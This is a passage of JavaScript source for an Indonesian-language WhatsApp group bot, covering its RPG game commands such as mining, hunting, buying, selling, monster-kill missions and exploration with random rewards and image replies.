 🛠️ *Ingot Ore* : ${getMiningingot(m.sender) ? getMiningingot(m.sender) : 0}\n
 🪵 *Wood* : ${getNebangKayu(m.sender) ? getNebangKayu(m.sender) : 0}\n`
await RezzHost.sendMessage(m.chat, {
text: teksehmazeh,
contextInfo: {
externalAdReply: {
title: `${pushname} PROFILE & BAG`, 
body: 'Play RPG Games With Your Friends',
thumbnailUrl: ppuser,
sourceUrl: `${global.saluran}`,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
break
case 'isaldo': case 'atm': case 'uang': case 'balance':{
if(!isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
let teksehmazeh = `
*UANG ANDA*
 *💰 Money* : $${users.balance}
 *💵 Saldo* : Rp. ${toRupiah(users.balance)}
 `
await RezzHost.sendMessage(m.chat, {
text: teksehmazeh,
contextInfo: {
externalAdReply: {
title: `${pushname} PROFILE & BAG`, 
body: 'SALDO ANDA',
thumbnailUrl: 'https://telegra.ph/file/12bc8dde0952bf195736e.jpg',
sourceUrl: `${global.saluran}`,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
break
case 'mining': case 'mine':{
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (isCekDarah < 1) return m.reply(`Kamu Lelah!, Coba Sembuhkan Menggunakan Ramuan`) 
let besi = [1,2,5,0,3,0,1,1,4,1,5,0,0]
let emas = [0,1,2,3,0,0,0,1,1,0,0,2]
let emerald = [0,0,1,0,0,1,0,2,1,0,0,1]
var besinya = besi[Math.floor(Math.random() * besi.length)]
var emasnya = emas[Math.floor(Math.random() * emas.length)]
var emeraldnya = emerald[Math.floor(Math.random() * emerald.length)]
setTimeout( async () => {
let caption = `_MINING RESULT_\n\n*Iron* : ${besinya}\n*Gold* : ${emasnya}\n*Emerald* : ${emeraldnya}`
await RezzHost.sendMessage(m.chat, {image:{ url : 'https://telegra.ph/file/d17479f0a56cc52826101.jpg'}, caption: caption}, {quoted: m})
}, 7000)
setTimeout( async () => {
await RezzHost.sendTextWithMentions(m.chat, `@${m.sender.split("@")[0]} Otw Mining`, m) 
}, 1500)
kurangDarah(m.sender, 10)
addBesi(m.sender, besinya)
addEmas(m.sender, emasnya)
addEmerald(m.sender, emeraldnya) 
}
break
case 'beli': case 'buy':{
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (!text) return m.reply(`Mau buy apa lu?\n\n1.potion\n2.baitfood\n3.limit\n\nExample: ${prefix + command} baitfood`)
var anu = args[1]
if (args[0] === 'potion'){
let noh = 100000 * anu
 if (!args[1]) return m.reply(`Example : ${prefix + command} potion 2\n 1 Potion = 100000 Money`)
 if (isMonay < noh) return m.reply('Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini')
 users.balance -= noh
 var apalu = anu * 1
 addPotion(m.sender, apalu)
setTimeout( async () => {
 m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${users.balance}\n*Potion* : ${getPotion(m.sender)}`)
}, 2000) 
 } else 
 if (args[0] === 'baitfood'){
let noh = 5000 * anu
 if (!args[1]) return m.reply(`Example : ${prefix + command} baitfood 2\n 1 Bait Food = 2500 Money`)
 if (isMonay < noh) return m.reply('Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini')
 users.balance -= noh
 var apalu = anu * 1
 addUmpan(m.sender, apalu)
setTimeout( async () => {
 m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${users.balance}\n*Bait Food* : ${getUmpan(m.sender)}`)
}, 2000) 
} else 
if (args[0] === 'limit'){
let noh = 35000 * anu
 if (!args[1]) return m.reply(`Example : ${prefix + command} limit 2\n 1 Limit = 35000 Money`)
 if (isMonay < noh) return m.reply('Sisa Uang Anda Tidak Cukup Untuk Pembelian Ini')
 users.balance -= noh
 var apalu = anu * 1
 addLimit(m.sender, apalu)
setTimeout( async() => {
 m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${users.balance}\n*Limit* : ${getLimit(m.sender)}`)
}, 2000) 
} else { 
m.reply(`Mau buy apa lu?\n\n1.potion\n2.baitfood\n3.limit\n\nExample: ${prefix + command} baitfood`)}
 }
 break
case 'sell': case 'sel': case 'jual':{
 if(!isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
 if (!text) return m.reply(`Mau jual apa?\n- fish\n- chicken\n- rabbit\n- sheep\n- cow\n- elephant\n- iron\n- gold\n- emerald\n\nExample : ${prefix + command} fish 2`)
var anu = args[1]
 if (args[0] === 'fish'){
 if (isIkan < anu) return m.reply(`Anda Tidak Memiliki Cukup Ikan Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Example : ${prefix + command} fish 2\n 1 Fish = 1500 Money`)
 kurangIkan(m.sender, anu)
let monaynya = 1500 * anu
 users.balance += monaynya
setTimeout( async () => {
 m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${users.balance}\n*Sisa Ikan Fish : ${getIkan(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'chicken'){
 if (isAyam < anu) return m.reply(`Anda Tidak Memiliki Cukup Ayam Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Example : ${prefix + command} chicken 2\n 1 Chicken = 2500 Money`)
 kurangAyam(m.sender, anu)
let monaynya = 2500 * anu
 users.balance += monaynya
setTimeout( async () => {
m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${users.balance}\n*Sisa Ayam* : ${getAyam(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'rabbit'){
 if (isKelinci < anu) return m.reply(`Anda Tidak Memiliki Cukup Kelinci Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Example : ${prefix + command} rabbit 2\n 1 Rabbit = 3000 Money`)
 kurangKelinci(m.sender, anu)
let monaynya = 3000 * anu
 users.balance += monaynya
setTimeout( async () => {
 m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${users.balance}\n*Sisa kelinci* : ${getKelinci(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'sheep'){
 if (isDomba < anu) return m.reply(`Anda Tidak Memiliki Cukup Domba Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Example : ${prefix + command} domba 2\n 1 Sheep = 5000 money`)
 kurangDomba(m.sender, anu)
let monaynya = 5000 * anu
 users.balance += monaynya
setTimeout( async () => {
 m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${users.balance}\n*Sisa domba* : ${getDomba(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'cow'){
 if (isSapi < anu) return m.reply(`Anda Tidak Memiliki Cukup Sapi Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Example : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
 kurangSapi(m.sender, anu)
let monaynya = 10000 * anu
 users.balance += monaynya
setTimeout( async () => {
 m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${users.balance}\n*Sisa sapi* : ${getSapi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'elephant'){
 if (isGajah < anu) return m.reply(`Anda Tidak Memiliki Cukup Gajah Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Example : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
 kurangGajah(m.sender, anu)
let monaynya = 15000 * anu
 users.balance += monaynya
setTimeout( async () => {
 m.reply(`Transaksi Berhasil ✅\n*Sisa uang* : ${users.balance}\n*Sisa gajah* : ${getGajah(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'iron'){
 if (isBesi < anu) return m.reply(`Anda Tidak Memiliki Cukup Besi Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Example : ${prefix + command} iron 2\n 1 Iron = 15000 Money`)
 kurangBesi(m.sender, anu)
let monaynya = 16000 * anu
 users.balance += monaynya
setTimeout( async () => {
 m.reply(`Transaksi berhasil ✅\n*Sisa uang* : ${users.balance}\n*Sisa besi* : ${getBesi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'gold'){
 if (isEmas < anu) return m.reply(`Anda Tidak Memiliki Cukup Emas Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Example : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
 kurangEmas(m.sender, anu)
let monaynya = 50000 * anu
 users.balance += monaynya
setTimeout( async () => {
 m.reply(`Transaksi berhasil ✅\n*Sisa uang* : ${users.balance}\n*Sisa emas* : ${getEmas(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < anu) return m.reply(`Anda Tidak Memiliki Cukup Zamrud Untuk Transaksi Ini`)
 if (!args[1]) return m.reply(`Example : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
 kurangEmerald(m.sender, anu)
let monaynya = 100000 * anu
 users.balance += monaynya
setTimeout( async () => {
 m.reply(`Transaksi berhasil ✅\n*Sisa uang* : ${users.balance}\n*Sisa zamrud* : ${getEmerald(m.sender)}`)
}, 2000) 
 } else { 
 m.reply(`Mau jual apa?\n- fish\n- chicken\n- rabbit\n- sheep\n- cow\n- elephant\n- iron\n- gold\n- emerald\n\nExample : ${prefix + command} fish 2`)
 }

 }
 break
case 'heal':{
 
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (!isCekDarah < 1) return m.reply('Anda Hanya Dapat Menyembuhkan Saat Darah Anda 0')
if (isCekDarah > 100) return m.reply('Darahmu Penuh')
if (isPotion < 1) return m.reply(`Anda Tidak Punya Ramuan, Coba Beli Dengan Cara #buypotion _amount_`) 
 addDarah(m.sender, 100)
 kurangPotion(m.sender, 1)
m.reply('Done! Darah mu dah full')
 }
 break
case 'hunt': case 'hunting': {
if(!isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (isCekDarah < 1) return m.reply('Darahmu Habis, Coba Sembuhkan Menggunakan Ramuan') 
let luka = ["Pierced by a thorn while hunting","Slipped into the abyss while hunting","Scratched by a wild animal","Not careful","Entangled in roots","Fall while hunting"]
let location = ["Jungle","Amazon forest","Tropical forest","Meadow","African forest","Mountains"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)]
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
if (lokasinya === 'Jungle') {
var image = 'https://telegra.ph/file/92967f55b1f437fdd55fe.jpg'
} else
if (lokasinya === 'Amazon forest') {
var image = 'https://telegra.ph/file/2b9b53837d9f109862224.jpg'
} else
if (lokasinya === 'Tropical forest') {
var image = 'https://telegra.ph/file/bd662563855328a1832e6.jpg'
} else
if (lokasinya === 'Meadow') {
var image = 'https://telegra.ph/file/66435cf783e308b19927e.jpg'
} else
if (lokasinya === 'African forest') {
var image = 'https://telegra.ph/file/c5996d581846f70ed1514.jpg'
} else
if (lokasinya === 'Mountains') {
var image = 'https://telegra.ph/file/ca8f84d91ca3e1d5efa59.jpg'
}
 setTimeout( async () => {
let teksehmazeh = `_HUNT RESULT_\n\n`
 teksehmazeh += `*🐟Fish* : ${ikanmu}\n`
 teksehmazeh += `*🐔Chicken* : ${ayam}\n`
 teksehmazeh += `*🐇Rabbit* : ${kelinci}\n`
 teksehmazeh += `*🐑Sheep* : ${domba}\n`
 teksehmazeh += `*🐄Cow* : ${sapi}\n`
 teksehmazeh += `*🐘Elephant* : ${gajah}\n\n`
 teksehmazeh += `_INFO_\n`
 teksehmazeh += `*Location* : ${lokasinya}\n`
 teksehmazeh += `*Wounded* : ${lukanya}, blood - 10\n`
 teksehmazeh += `*Remaining blood* : ${getDarah(m.sender)}\n`
await RezzHost.sendMessage(m.chat, {image:{ url: image }, caption: teksehmazeh}, {quoted: m})
}, 5000)
 setTimeout( () => {
RezzHost.sendTextWithMentions(m.chat, `@${m.sender.split("@")[0]} Started Hunting In ${lokasinya}`, m) 
}, 1000) 
 addIkan(m.sender, ikanmu) 
addAyam(m.sender, ayam) 
addKelinci(m.sender, kelinci)
addDomba(m.sender, domba)
addSapi(m.sender, sapi)
addGajah(m.sender, gajah)
 kurangDarah(m.sender, 10)
 }
 break
case 'adventure':{
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ngab = ['Avalanche','Volcanic Eruption','Tsunami','Earthquake','Meteor','Demon']
var sesuatu = ngab[Math.floor(Math.random() * ngab.length)]
var dungeon =['Whetstone','Willow Field','Rodeo','Verdant Blufs','Bull Holland','Fallen Tree','Dellnort','Verona Lush','Leafy Hollow','Chilliad Dome','Garcia','Pine Valley','Santa Florals','Guvero East','Cranbarry','Junever','Aldea Malvada','Green Palms','Green Oasis','Fort Carson','Prickel Pine','Pilson Meadow','Boca Roca','Rocksore East','Camel Toe','Hanky Panky','Fern Ridge','Montgomerry','Flint Yankton','Vespucci','fortress city', 'ravines valley', 'horizon valley', 'cyber city', 'end city', 'templar city', 'pochinki', 'peak','Vertical Zone','Sentainel Country','Night City','Flush City','Royals Canyon','Blackburn','Peterborough','Tarnstead','Jarren’s','Outpost','Landow','Nearon','Kincardine','Aysgarth','Veritas','Openshaw','Bredwardine','Berkton','Wolford','Norwich','Kald','Solaris','Kilead','Pitmerden','Acomb','Eldham','Warcester','Lingmell','Kilead','Cromerth','Wingston','Garmsby','Kingcardine','Perthlochry','Frostford','Hillford','Hardersfield','Tarrin','Holmfirth','Caerleon','Elisyum','Ballaeter','Penshaw','Bradford','Wigston','Accreton','Kameeraska','Ferncombe','Kilerth','Erostey','Carran','Jongvale','Larnwick','Queenstown','Whaelrdrake','Baerney','Wingston','Arkney','Strongfair','Lowestoft','Beggar’s Hole','Shepshed','Perthlochry','Ironforge','Tywardreath','Pontheugh','Foolshope','Hull','Dalmerlington','Aucteraden','Woodpine','Millstone','Windermere','Lancaster','Kirkwall','Rotherhithe','Astrakhan','Watford','Ritherhithe','Krosstoen','Pella’s','Wish','Grimsby','Ayrith','Ampleforth','Skystead','Eanverness','Penshaw','Peatsland','Astrakane','Pontybridge','Caershire','Snowbush','Sutton','Northwich','Hogsfeet','Claethorpes','Sudbury','Cherrytown','Blue Field','Orrinshire','Aempleforth','Garrigill','Jedburgh','Eastbourne','Taedmorden','Venzor','Grasmere','Ubbin','Falls','Violl’s Garden','Glanchester','Bailymena','Arkkukari','Skargness','Cardend','Llanybydder','Faversham','Yellowseed','Carlisle','Cirencester','Aramoor','Furness','Kincardine','Rotherham','Emelle','Boroughton','Carran','Ffestiniog','Mansfield','Huthwaite','Marclesfield','Pavv','Squall’s End','Glenarm','Dragontail','Moressley','Hardersfield','Gilramore','Aria','Ecrin','Clare View Point','Blackburn','Oakheart','Doonatel','Broughton','Carlisle','Murlayfield','Nuxvar']
var sesuatuu = dungeon[Math.floor(Math.random() * dungeon.length)]
hasm = "https://telegra.ph/file/ff94536d69e0f4f3e7b54.jpg"
var adven = Math.ceil(Math.random() * 1000)
var money = Math.ceil(Math.random() * 300)
setTimeout( () => {
var hg = `「 DEATH 」\n\n *┊ Place* ${sesuatuu}\n ┊ *MONEY :* $${money}\n ┊ *EXP :* ${adven}Xp`
RezzHost.sendMessage(m.chat, {image:{url:hasm}, caption: hg},{quoted:m})
}, 7000)
setTimeout( () => {
 m.reply(`Awass`)
}, 5000) // 1000 = 1s,
setTimeout( () => {
 m.reply(`Tiba-tiba Ada ${sesuatu}`)
}, 3000) // 1000 = 1s,
setTimeout( () => {
 m.reply(`${pushname} On an Adventure`)
}, 0) // 1000 = 1s,
users.exp += adven
users.balance += money
}
break
case 'ojek': case 'ngojek':{
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
var adven = Math.ceil(Math.random() * 1000)
var money = Math.ceil(Math.random() * 300)
setTimeout( () => {
var hg = `
*—[ Hasil Ngojek ${pushname} ]—*
 ➕ 💹 Uang = [ ${money} ]
 ➕ ✨ Exp = [ ${adven} ] 
 ➕ 😍 Order Selesai = +1
`
 m.reply(hg)
}, 10000)
setTimeout( () => {
 m.reply(`
➕ 💹Menerima gaji....
`)
}, 9000)
setTimeout( () => {
 m.reply(`
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳🌳 🏘️


➕ Sampai di tujuan...
`)
}, 7000)
setTimeout( () => {
 m.reply(`
🚶🛵⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳🌳 🏘️


➕ Mengantar ke tujuan....
`)
}, 5000) // 1000 = 1s,
setTimeout( () => {
 m.reply(`
Mendapatkan Orderan...
`)
}, 3000) // 1000 = 1s,
setTimeout( () => {
 m.reply(`Mencari Pelanggan...`)
}, 0) // 1000 = 1s,
users.exp += adven
users.balance += money
}
break
case 'luckyday':
case 'luckytime':{
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 450)
a = randomNomor(99)
b = randomNomor(500)
c = randomNomor(150)
users.balance += b
users.exp += ez
addEmas(m.sender, a)
addBesi(m.sender, c)
 m.reply(`🎰 *Lucky*\n┊ *Money:* $${b}\n┊ *Gold :* ${a}\n┊ *Iron :* ${c}\n┊ *XP :* ${ez}`)
}
break
case 'slime':
case 'killslime':{
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 400)
users.exp += ez
a = randomNomor(55)
b = randomNomor(400)
c = randomNomor(80)
d = randomNomor(3)
users.exp += ez
users.balance += b
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bufutI = "https://telegra.ph/file/c34a444fa8824d8bb6e18.jpg"
var hg = `*Misi kill Slime*\n\n🎁 *Hadiah untuk killing Slime*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*`
RezzHost.sendMessage(m.chat, {image:{url:bufutI},caption: hg} , {quoted:m}) 
}
break
case 'goblin':
case 'killgoblin':{
 
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 500)
users.exp += ez
a = randomNomor(65)
b = randomNomor(500)
c = randomNomor(90)
d = randomNomor(5)
users.exp += ez
users.balance += b
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bufo = "https://telegra.ph/file/19bdc38aaafda29f7afe1.jpg"
var hg = `*Misi kill Goblin*\n\n🎁 *Hadiah untuk killing Goblin*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*`
RezzHost.sendMessage(m.chat, {image:{url:bufo}, caption: hg }, {quoted:m})
}
break
case 'devil':
case 'killdevil':{
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 600)
users.exp += ez
a = randomNomor(70)
b = randomNomor(600)
c = randomNomor(95)
d = randomNomor(6)
users.exp += ez
users.balance += b
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bufas = "https://telegra.ph/file/dbecd2f871988f52bf555.jpg"
var hg = `*Misi kill Devil*\n\n🎁 *Hadiah untuk killing Devil*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*`
RezzHost.sendMessage(m.chat, {image:{url: bufas}, caption: hg }, {quoted:m})
}
break
case 'behemoth':
case 'killbehemoth':{
 
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 700)
users.exp += ez
a = randomNomor(75)
b = randomNomor(600)
c = randomNomor(100)
d = randomNomor(7)
users.exp += ez
users.balance += b
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
batai = "https://telegra.ph/file/43259a7d8accff8b627c0.jpg"
var hg = `*Misi kill Behemoth*\n\n🎁 *Hadiah untuk kiling Behemoth*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold:* ${a}\n ┊ *Diamond:* ${d}\n\n*Terima kasih telah menjalankan misi ini*`
RezzHost.sendMessage(m.chat, {image:{url: batai}, caption: hg }, {quoted:m})
}
break
case 'demon':
case 'killdemon':{
 
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 850)
users.exp += ez
a = randomNomor(90)
b = randomNomor(900)
c = randomNomor(120)
d = randomNomor(10)
users.exp += ez
users.balance += b
addEmas(m.sender, a)
addBesi(m.sender, c)
addDm(m.sender, d)
bhuu = "https://telegra.ph/file/4a264a10ea2e5f18314f1.jpg"
var hg = `*Misi kill Demon*\n🎁 *Demon Kill Reward*\n ┊ *Money:* $${b}\n ┊ *Iron:* ${c}\n ┊ *Gold*: ${a}\n ┊ *Diamond:* ${d}\n\n*Terima Kasih Telah Melaksanakan Misi Ini*`
RezzHost.sendMessage(m.chat, {image: {url: bhuu}, caption: hg }, {quoted:m})
}
break
case 'demonking':
case 'killdemonking':{
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
ez = Math.ceil(Math.random() * 1000)
users.exp += ez
users.balance += 1999
addEmas(m.sender, 99)
addBesi(m.sender, 99)
addDm(m.sender, 99)
bhuud = "https://telegra.ph/file/cdf482a8de192189057d8.jpg"
var hg = `*Misi kill DemonKing*\n\n🎁 *DemonKing Kill Reward*\n ┊ *Money* : $${b}\n ┊ *Iron :* ${c}\n ┊ *Gold :* ${a}\n ┊ *Diamond :* ${d}\n\n*Terima Kasih Telah Melaksanakan Misi Ini*`
RezzHost.sendMessage(m.chat, {image:{url: bhuud}, caption: hg }, {quoted:m})
}
break
case 'sellikan':{
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (args.length < 1) return m.reply(`Kirim perintah *${prefix + command}* jumlah untuk dijual\n\nContoh *${prefix + command}* 10`)
jmlh = text
rp = 5 * jmlh
if (getFish(m.sender) < jmlh) return m.reply(`*Ikan Anda Tidak Cukup*`)
sellFish(m.sender, jmlh, balance)
users.balance += rp
 m.reply(`🛍️ *MARKET*\n ┊ Seller : ${pushname}\n ┊ Buyer : Admin\n ┊ Price/Fish : 5\n ┊ Status : Success\n ┊ Left FishPrice/Fish : ${await getFish(m.sender)}\n ┊ Sales Results : $${rp}`)
}
break
case 'sellbesi':{
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (args.length < 1) return m.reply(`Kirim perintah *${prefix + command}* jumlah untuk dijual\n\nContoh *${prefix + command}* 10`)
jmlh = text
rp = 10 * jmlh
if (getBesi(m.sender) < jmlh) return m.reply(`Besi Tidak Cukup`)
sellBesi(m.sender, jmlh, balance)
users.balance += rp
 m.reply(`🛍️ MARKET\n ┊ Seller : ${pushname}\n ┊ Buyer : Admin\n ┊ Harga/Besi : 10\n ┊ Status : Sukses\n ┊ Sisa Besi : ${await getBesi(m.sender)}\n ┊ Sales Results : $${rp}`)
}
break
case 'sellemas':{
if (!m.isGroup) return m.reply("Khusus Group")
if (!isPetualang) return m.reply('Kamu belum terdaftar dalam database rpg silahkan ketik .joinrpg')
if (args.length < 1) return m.reply(`Kirim perintah *${prefix + command}* jumlah untuk dijual\n\nContoh *${prefix + command}* 10`)
jmlh = text
rp = 25 * jmlh
if (getEmas(m.sender) < jmlh) return m.reply(`Emas Anda Tidak Cukup`)
sellEmas(m.sender, jmlh, balance)
users.balance += rp
 m.reply(`🛍️ MARKET\n ┊ Seller : ${pushname}\n ┊ Buyer : Admin\n ┊ Harga/Emas : 25\n ┊ Status : Sukses\n ┊ Sisa Emas : ${getEmas(m.sender)}\n ┊ Sales Results : $${rp}`)
}
break 
case 'jelajah': {
var tempsa = args.join(" ")
if (tempsa == 'corbiens river') {
var asu = `https://telegra.ph/file/00018dab77a6cea81523e.jpg`
setTimeout( async () => {
const vio = Math.ceil(Math.random() * 70) 
const pikan = Math.ceil(Math.random() * 15)
addStone(m.sender, vio)
addIkan(m.sender, pikan)
RezzHost.sendMessage(m.chat, {image:{url: asu}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${vio}* batu dan *${pikan}* ikan${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
}, 2000); //2 minute
setTimeout( () => {
 m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) 
} else if (tempsa === 'chiltawa woods') {
let gos = `https://telegra.ph/file/77c3badc9f97d6589a30f.jpg`
setTimeout( async () => {
const tesaaq = Math.ceil(Math.random() * 110) // batu
const ise = Math.ceil(Math.random() * 20)
addStone(m.sender, tesaaq)
addKayu(m.sender, ise)
RezzHost.sendMessage(m.chat, {image:{url:gos},caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${tesaaq}* batu dan *${ise}* kayu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
}, 2000); //2 minute
setTimeout( () => {
 m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec
} else if (tempsa === 'cochher sea') { 
let seae = `https://telegra.ph/file/eabfc907cfc447386b0c0.jpg`
setTimeout( async () => {
const feds = Math.ceil(Math.random() * 65)
addIkan(m.sender, feds)
RezzHost.sendMessage(m.chat, {image:{url: seae},caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${feds}* ikan${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`}, {quoted:m})
}, 2000); //2 minute
setTimeout( () => {
 m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec
} else if (tempsa === 'limingstall mountains') {
let seoe = `https://telegra.ph/file/19a10ff95c31af10267e4.jpg`
setTimeout(() => {
const fads = Math.ceil(Math.random() * 50)
const fids = Math.ceil(Math.random() * 80)
addOre(m.sender, fads)
addStone(m.sender, fids)
RezzHost.sendMessage(m.chat, {image:{url:seoe}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${fads}* copper ore dan ${fids} batu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
}, 2000); //2 minute
setTimeout( () => {
 m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'chade mountain') {
let seye = `https://telegra.ph/file/efdcd7d07dd22294695a8.jpg`
setTimeout( () => {
const pore = Math.ceil(Math.random() * 40)
const pone = Math.ceil(Math.random() * 60)
addOre(m.sender, pore)
addStone(m.sender, pone)
RezzHost.sendMessage(m.chat, {image:{url:seye}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${pore}* copper ore dan ${pone} batu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
}, 3000); //2 minute
setTimeout( () => {
 m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'gerbil woods') {
let siae = `https://telegra.ph/file/44fc684be9865c0fcb5fa.jpg`
setTimeout( async () => {
const tzys = Math.ceil(Math.random() * 90) // batu
const isue = Math.ceil(Math.random() * 45)
addStone(m.sender, tzys)
addKayu(m.sender, isue)
RezzHost.sendMessage(m.chat, {image:{url:siae}, caption: `*Congratulation 🎊*${enter}${enter}Kamu mendapatkan *${tzys}* batu dan *${isue}* kayu${enter}${enter}Cek inventory anda dengan cara ketik ${prefix}inventory`},{quoted:m})
}, 2000); //2 minute
setTimeout( () => {
 m.reply('Sedang berpetualang, silahkan tunggu...')
}, 0) //1sec

} else if (tempsa === 'moobiens grassland') {
let bbbb = `https://telegra.ph/file/0c3fa86f57a4f6d9c4c0e.jpg`
setTimeout( () => {
const awqu = Math.ceil(Math.random() * 200) // batu
const usui = Math.ceil(Math.random() * 20)
addStone(m.sender, awqu)
addKayu(m.sender, usui)
